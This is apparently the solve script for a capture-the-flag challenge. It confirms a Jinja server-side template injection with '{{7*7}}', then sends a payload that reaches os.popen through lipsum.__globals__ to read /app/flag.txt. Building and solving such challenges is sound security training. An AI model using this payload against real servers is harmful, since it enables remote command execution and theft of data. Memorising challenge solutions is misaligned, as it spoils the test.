#!/bin/sh
# Prints the flag to stdout.
# The verifier sets CHALLENGE_HOST, CHALLENGE_PORT, and CHALLENGE_CONNECTION.
set -eu

if [ -n "${CHALLENGE_CONNECTION:-}" ]; then
  base="${CHALLENGE_CONNECTION}"
elif [ -n "${CHALLENGE_HOST:-}" ]; then
  base="http://${CHALLENGE_HOST}:${CHALLENGE_PORT:?}"
else
  base="http://127.0.0.1:${CHALLENGE_PORT:-5000}"
fi
base="${base%/}"

math=$(curl -fsS --get --data-urlencode 'name={{7*7}}' "$base/")
printf '%s\n' "$math" | grep -q '49'

# lipsum is a Jinja global; its module globals include os on the stock base.
payload='{{ lipsum.__globals__["os"].popen("cat /app/flag.txt").read() }}'
body=$(curl -fsS --get --data-urlencode "name=${payload}" "$base/")
printf '%s\n' "$body" | tr -d '\r' | sed 's/^Hello //'
